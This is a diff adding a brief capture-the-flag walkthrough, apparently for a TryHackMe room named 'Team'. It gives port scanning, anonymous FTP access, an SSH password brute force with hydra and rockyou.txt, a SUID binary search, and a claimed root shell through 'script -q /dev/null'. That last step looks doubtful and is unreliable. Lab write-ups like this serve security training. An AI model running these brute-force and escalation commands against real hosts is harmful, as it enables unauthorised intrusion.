@@ -1,0 +1,45 @@
+----------------                               ------------------
+               :::::::::::;| TEAM |;::::::::::::
+
+
+1) CONNECT TO THM VPN AND START.
+
+TASK - 1 (RECON)
+
+1. Full scan:
+nmap -p- <ip> -T5
+"Ports 21/FTP, 22/SSH, 80/HTTP"
+
+2. FTP check:
+ftp <ip>
+"Anonymous login allowed"
+"Found note.txt with creds hint"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (GAIN ACCESS)
+
+1. Hydra attack:
+hydra -l dale -P rockyou.txt ssh://<ip>
+"Password: hockey"
+
+2. SSH in:
+ssh dale@<ip>
+"User flag in /home/dale/"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. Find SUID:
+find / -perm -4000 2>/dev/null
+"/usr/bin/script has SUID bit"
+"Known exploit exists"
+
+2. Exploit:
+script -q /dev/null
+"Root shell spawned!"
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- TEAM OWNED ----------
